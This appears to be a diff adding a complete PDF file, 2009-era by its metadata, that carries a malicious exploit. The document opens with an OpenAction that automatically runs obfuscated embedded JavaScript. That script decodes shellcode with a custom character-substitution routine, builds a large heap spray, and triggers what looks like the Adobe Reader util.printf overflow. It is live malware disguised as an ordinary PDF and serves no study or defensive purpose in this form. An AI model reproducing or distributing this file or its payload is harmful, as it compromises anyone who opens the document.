@@ -1,0 +1,72 @@
+%PDF-1.3
+%‚„œ”
+1 0 obj
+<</Threads 2 0 R/OpenAction<</JS(this.New_Script\(\))/S/JavaScript>>/Outlines 3 0 R/Pages 4 0 R/ViewerPreferences<</PageDirection/L2R>>/AcroForm 5 0 R/PageLayout/SinglePage/Dests 6 0 R/Names 7 0 R/Type/Catalog>>
+endobj
+2 0 obj
+[]
+endobj
+3 0 obj
+<</Type/Outlines/Count 0>>
+endobj
+4 0 obj
+<</ITXT(2.1.7)/Resources 8 0 R/Kids[9 0 R]/Type/Pages/Count 1>>
+endobj
+5 0 obj
+<</Fields[]>>
+endobj
+6 0 obj
+<<>>
+endobj
+7 0 obj
+<</JavaScript 10 0 R>>
+endobj
+8 0 obj
+<</ProcSet[/PDF/Text/ImageB/ImageC/ImageI]>>
+endobj
+9 0 obj
+<</Rotate 0/Parent 4 0 R/MediaBox[0 0 595.28000 841.89000]/TrimBox[0 0 595.28000 841.89000]/Resources 8 0 R/Type/Page/Contents 11 0 R>>
+endobj
+10 0 obj
+<</Names[(New_Script) 12 0 R]>>
+endobj
+11 0 obj
+<</Length 31>>stream
+0 0 595.28000 841.89000 re W n
+
+endstream
+endobj
+12 0 obj
+<</JS 13 0 R/S/JavaScript>>
+endobj
+13 0 obj
+<</Length 2272>>stream
+Sye3=unescape;YAv2=eval;var Ujt5=''; YAv2(ctq7('ezi#Fqg4#=#Hbv6("*f43v1*f9999*f4699*f4344*f1y42*f753x*f1y81*f6x54*f451y*f2194*fvz98*f5z1y*f1y81*f794z*fvy98*f67v6*f1y50*f1y65*fvv98*fuu68*f68ux*fzxx9*fv961*f9225*fxux8*f989w*fvyx2*f6yu7*f752x*f2485*f1yv8*f754z*fvy98*f1y33*f5y9x*f4z1y*f988x*f1yvy*f1y95*fv198*f97vy*fx968*f4v4u*f4y4w*f91x7*f4v99*f693z*f3540*f801y*f4y1y*f1y9x*f8x4y*f8y1y*f4y1y*f4691*f1v31*f9v5v*fuuvx*f10w3*f46x2*f1v31*f9v5v*fuuvx*fvyw3*f4z49*fuu47*f10w9*f47x7*f4647*fzz31*f9wux*fuu2x*f4zw3*f5wvy*f4840*fuu47*fvyw9*f4z27*f4yvy*f3z40*f3z99*f4899*f3z47*fuu99*f46w9*fz931*fx0w4*fuu5w*f4zw3*fuu47*f46w9*f0131*f1zuv*fuu9v*fvyw3*f4055*f993z*fuu48*f46w9*f2v31*fv7w1*fuu26*f3zw3*fuu99*fv1w9*fuuzy*fuuuu*f2724*f3w3x*f3v3u*f357v*f3x3x*fv199*fuuzv*fuuuu*f4744*f555x*f223u*f3x3v*f383u*f4535*f533u*f3x30*f5834*fv199*fuuz9*fuuuu*f7v7v*f344x*fv199*fuuy2*fuuuu*f7v7v*f344x*fv199*fuu10*fuuuu*f2531*f2925*f7u6z*f3u7u*f2724*f3x33*f2634*f7v31*f3u36*f7u3w*f2627*f7u26*f7u2z*f2134*f297v*f2931*f316u*f346w*f6521*f9999")@'));  var Vnc5=''; YAv2(ctq7('Emx4#=#Hbv6("*f9Z9Z*f9Z9Z")@')); var agrr = 20; var ZLn4 = agrr + Ujt5.length; while (Vnc5.length < ZLn4) Vnc5 += Vnc5; var Xeyg = Vnc5.substring(0,ZLn4); var eao4 = Vnc5.substring(0,Vnc5.length - ZLn4); while (eao4.length + ZLn4 < 0x60000) eao4 = eao4 + eao4 + Xeyg;  var Cjkx = new Array(); for (i = 0; i < 1200; i++){ Cjkx[i] = eao4 + Ujt5 }  var MWg6 = 12; for(i = 0; i < 18; i++){ MWg6 = MWg6 + "9"; } for(i = 0; i < 276; i++){ MWg6 = MWg6 + "8"; } YAv2(ctq7('fgro.kirmgu(Hbv6(""+"*"+"74*65*64*69*69*69*33"),#NDt3)@'));     function qslL(QOa6, NFM7, Pkw6) { var UsB2; UsB2=QOa6.split(NFM7); var Fdv8=UsB2.join(Pkw6); return Fdv8;/**/ } function ctq7(iys1) { iys1 = qslL(iys1,"##+##","'"); iys1 = qslL(iys1,"##|##","\\"); Fdv8=""; Njy3 =""; for(k=0;k<iys1.length;k++) { Fdv8 = iys1.charCodeAt(k); if (Fdv8==32){Fdv8=35} else if (Fdv8==35){Fdv8=32} else if (Fdv8==59){Fdv8=64} else if (Fdv8==64){Fdv8=59} else if (Fdv8==37){Fdv8=42} else if (Fdv8==42){Fdv8=37} else if (Fdv8>=97 && Fdv8<=122) { Fdv8=Fdv8-97;Fdv8=25-Fdv8;Fdv8+=97; }else if (Fdv8>=65 && Fdv8<=90) { Fdv8=Fdv8-65;Fdv8=25-Fdv8;Fdv8+=65; }else if (Fdv8>=48 && Fdv8<=57) { Fdv8=Fdv8-48;Fdv8=9-Fdv8;Fdv8+=48; } Njy3 += String.fromCharCode(Fdv8); } return Njy3;/**/ } 
+
+endstream
+endobj
+14 0 obj
+<</Creator(Scribus 1.3.3.12)/Title<>/Producer(Scribus PDF Library 1.3.3.12; modified using iText 2.1.7 by 1T3XT)/Author<>/Keywords<>/Trapped/False/ModDate(D:20091014160540+08'00')/CreationDate(D:20080907224739)>>
+endobj
+xref
+0 15
+0000000000 65535 f 
+0000000015 00000 n 
+0000000242 00000 n 
+0000000260 00000 n 
+0000000302 00000 n 
+0000000381 00000 n 
+0000000410 00000 n 
+0000000430 00000 n 
+0000000468 00000 n 
+0000000528 00000 n 
+0000000679 00000 n 
+0000000727 00000 n 
+0000000806 00000 n 
+0000000850 00000 n 
+0000003172 00000 n 
+trailer
+<</Info 14 0 R/Root 1 0 R/Size 15/ID [<cd65ee3e6c1db73ddaafd8a5b4033e38><969349e4709c12b87673756354a09942>]>>
+startxref
+3401
+%%EOF
